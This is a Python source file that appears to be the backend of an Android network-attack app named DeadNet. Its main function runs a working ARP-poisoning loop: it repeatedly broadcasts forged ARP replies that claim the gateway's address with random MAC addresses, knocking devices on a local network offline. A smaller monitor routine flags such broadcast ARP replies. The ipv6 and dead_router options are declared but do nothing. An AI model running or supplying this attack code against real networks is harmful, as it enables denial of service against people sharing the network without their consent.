"""
DeadNet Backend for Native Android
Direct Python functions called from Java via Chaquopy
"""

import threading
import time
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('DeadNet')

# State
_attack_state = {
    'active': False,
    'cycles': 0,
    'packets': 0,
    'duration': 0,
    'logs': []
}
_attack_lock = threading.Lock()
_attacker = None

_defend_state = {
    'active': False,
    'packets': 0,
    'suspicious': 0,
    'alerts': []
}
_defend_lock = threading.Lock()
_sniffer = None


def get_interfaces():
    """Get network interfaces - returns list of dicts"""
    try:
        import netifaces
        result = []
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addrs:
                ip = addrs[netifaces.AF_INET][0].get('addr')
                if ip and ip != '127.0.0.1' and not ip.startswith('169.254'):
                    result.append({'name': iface, 'ip': ip})
        return result
    except Exception as e:
        logger.error(f"Interface error: {e}")
        return []


def start_attack(iface, interval, arp=True, ipv6=True, dead_router=True):
    """Start network attack"""
    global _attacker
    
    with _attack_lock:
        if _attack_state['active']:
            return False
        _attack_state['active'] = True
        _attack_state['cycles'] = 0
        _attack_state['packets'] = 0
        _attack_state['duration'] = 0
        _attack_state['logs'] = ['[+] Starting attack...']
    
    def run():
        global _attacker
        try:
            # Lazy import scapy
            from scapy.all import conf, ARP, Ether, RandMAC, sendp, getmacbyip
            import netifaces
            conf.verb = 0
            
            # Get gateway
            gws = netifaces.gateways()
            gateway = None
            if 'default' in gws and netifaces.AF_INET in gws['default']:
                gateway = gws['default'][netifaces.AF_INET][0]
            
            if not gateway:
                add_log("[!] No gateway found")
                return
            
            gateway_mac = getmacbyip(gateway)
            add_log(f"[*] Gateway: {gateway} ({gateway_mac})")
            add_log(f"[*] Interface: {iface}")
            add_log(f"[*] Interval: {interval}s")
            
            while _attack_state['active']:
                cycle_start = time.time() * 1000
                packets = 0
                
                if arp:
                    # ARP poison - broadcast
                    try:
                        arp_pkt = ARP(op=2, psrc=gateway, hwsrc=RandMAC(), pdst=gateway)
                        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_pkt, iface=iface, verbose=0)
                        packets += 1
                    except Exception as e:
                        add_log(f"[!] ARP error: {e}")
                
                cycle_duration = int(time.time() * 1000 - cycle_start)
                
                with _attack_lock:
                    _attack_state['cycles'] += 1
                    _attack_state['packets'] += packets
                    _attack_state['duration'] = cycle_duration
                
                add_log(f"[+] Cycle #{_attack_state['cycles']} - {packets} pkts - {cycle_duration}ms")
                time.sleep(interval)
                
        except Exception as e:
            add_log(f"[!] Error: {e}")
            logger.error(f"Attack error: {e}")
        finally:
            with _attack_lock:
                _attack_state['active'] = False
            add_log("[-] Attack stopped")
    
    threading.Thread(target=run, daemon=True).start()
    return True


def stop_attack():
    """Stop attack"""
    with _attack_lock:
        _attack_state['active'] = False
    return True


def get_status():
    """Get current attack status"""
    with _attack_lock:
        return {
            'active': _attack_state['active'],
            'cycles': _attack_state['cycles'],
            'packets': _attack_state['packets'],
            'duration': _attack_state['duration'],
            'logs': '\n'.join(_attack_state['logs'][-20:])
        }


def add_log(msg):
    """Add log message"""
    with _attack_lock:
        _attack_state['logs'].append(msg)
        if len(_attack_state['logs']) > 100:
            _attack_state['logs'] = _attack_state['logs'][-100:]
    logger.info(msg)


def start_defend(iface):
    """Start defender/monitor"""
    global _sniffer
    
    with _defend_lock:
        if _defend_state['active']:
            return False
        _defend_state['active'] = True
        _defend_state['packets'] = 0
        _defend_state['suspicious'] = 0
        _defend_state['alerts'] = []
    
    def run():
        global _sniffer
        try:
            from scapy.all import AsyncSniffer, ARP
            
            def callback(pkt):
                with _defend_lock:
                    _defend_state['packets'] += 1
                    # Simple detection: ARP reply to broadcast
                    if pkt.haslayer(ARP) and pkt[ARP].op == 2:
                        if pkt.dst == "ff:ff:ff:ff:ff:ff":
                            _defend_state['suspicious'] += 1
                            _defend_state['alerts'].append(
                                f"[!] Suspicious ARP from {pkt[ARP].psrc}"
                            )
            
            _sniffer = AsyncSniffer(iface=iface, prn=callback, store=False)
            _sniffer.start()
            
            while _defend_state['active']:
                time.sleep(0.1)
            
            _sniffer.stop()
        except Exception as e:
            logger.error(f"Defend error: {e}")
        finally:
            with _defend_lock:
                _defend_state['active'] = False
    
    threading.Thread(target=run, daemon=True).start()
    return True


def stop_defend():
    """Stop defender"""
    global _sniffer
    with _defend_lock:
        _defend_state['active'] = False
    if _sniffer:
        try:
            _sniffer.stop()
        except:
            pass
    return True


def get_defend_status():
    """Get defender status"""
    with _defend_lock:
        return {
            'active': _defend_state['active'],
            'packets': _defend_state['packets'],
            'suspicious': _defend_state['suspicious'],
            'alerts': '\n'.join(_defend_state['alerts'][-20:])
        }
